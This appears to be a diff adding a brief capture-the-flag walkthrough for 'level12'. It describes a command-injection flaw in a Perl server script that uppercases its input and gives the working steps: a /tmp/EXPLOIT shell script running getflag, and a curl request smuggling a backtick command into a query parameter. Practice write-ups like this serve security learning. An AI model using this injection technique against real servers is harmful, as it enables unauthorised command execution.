@@ -1,0 +1,7 @@
+1.	cat the file level12.pl
+2.	server side wait for params and passes it into two functions. One of which put to upper the param[0]
+3.	code injection on the lign where we have to input an arg
+4.	create file in capital letter /tmp/EXPLOIT >>> chmod 777 <file>
+	#!/bin/sh
+	getflag | wall
+5.	curl localhost:4646?x='`/*/exploit`' >>> simple quote so it is not exec at this moment so it is send to the pogram and backtip to consider that as a command to exec
